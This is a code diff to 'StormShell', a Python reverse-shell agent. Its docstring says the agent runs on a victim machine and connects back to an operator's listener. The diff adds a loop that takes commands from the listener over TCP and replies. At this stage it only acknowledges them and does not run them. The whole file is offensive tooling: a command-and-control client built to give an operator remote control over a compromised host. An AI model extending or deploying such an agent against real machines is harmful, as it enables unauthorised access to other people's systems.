@@ -3,15 +3,20 @@
 StormShell - Agent Module
 
 A lightweight TCP client that connects back to the StormShell listener.
-This module runs on the target (victim) machine and establishes a reverse
-TCP connection to the handler.  Currently performs a connect-then-disconnect
-cycle with robust error handling.
+This module runs on the target (victim) machine, establishes a reverse
+TCP connection to the handler, and enters a receive loop — waiting for
+commands and sending responses back to the operator.
 """
 
 import argparse
 import socket
 import sys
 import logging
+
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
+BUFFER_SIZE = 4096  # Max bytes to receive per recv() call
 
 # ---------------------------------------------------------------------------
 # Logger configuration
@@ -23,7 +28,8 @@ logger = logging.getLogger("stormshell.agent")
 class Agent:
     """
     Reverse-shell agent that initiates an outbound TCP connection to the
-    StormShell listener.
+    StormShell listener and enters a receive loop to process commands
+    sent by the operator.
 
     Attributes:
         host (str):   IP address of the remote listener.
@@ -99,6 +105,53 @@ class Agent:
             sys.exit(1)
 
     # ------------------------------------------------------------------
+    # Interactive receive loop
+    # ------------------------------------------------------------------
+
+    def _receive_loop(self) -> None:
+        """
+        Continuously listen for commands from the StormShell listener.
+
+        Behaviour:
+            - 'exit' command  → break out of the loop and shut down.
+            - Any other command → send an acknowledgement response back
+              to the listener.
+        """
+        logger.info("Entered receive loop — waiting for commands.")
+
+        while True:
+            try:
+                data = self.sock.recv(BUFFER_SIZE)
+
+                # Empty data means the listener disconnected.
+                if not data:
+                    logger.warning("Listener disconnected (empty data).")
+                    break
+
+                command = data.decode("utf-8", errors="replace").strip()
+                logger.debug("Received command: %s", command)
+
+                # Handle the 'exit' shutdown command.
+                if command.lower() == "exit":
+                    logger.info("Exit command received. Shutting down.")
+                    break
+
+                # For now, send back an acknowledgement to the listener.
+                response = f"[+] Command received by agent: {command}"
+                try:
+                    self.sock.sendall(response.encode("utf-8"))
+                    logger.debug("Sent acknowledgement for: %s", command)
+                except (BrokenPipeError, ConnectionResetError, OSError) as exc:
+                    logger.error("Failed to send response — %s", exc)
+                    break
+
+            except (ConnectionResetError, OSError) as exc:
+                logger.error("Connection lost — %s", exc)
+                break
+
+        logger.info("Receive loop ended.")
+
+    # ------------------------------------------------------------------
     # Cleanup helpers
     # ------------------------------------------------------------------
 
@@ -122,18 +175,12 @@ class Agent:
     def start(self) -> None:
         """
         Full agent lifecycle: create socket → connect to listener →
-        (future: interactive session) → graceful shutdown.
+        receive loop → graceful shutdown.
         """
         try:
             self._create_socket()
             self._connect()
-
-            # At this stage we do not yet have an interactive shell loop,
-            # so we simply acknowledge the connection and shut down cleanly.
-            print("[*] No interactive session available yet. Disconnecting.")
-            logger.info(
-                "Disconnecting — interactive session not implemented yet."
-            )
+            self._receive_loop()
 
         except KeyboardInterrupt:
             print("\n[!] Keyboard interrupt received. Shutting down …")
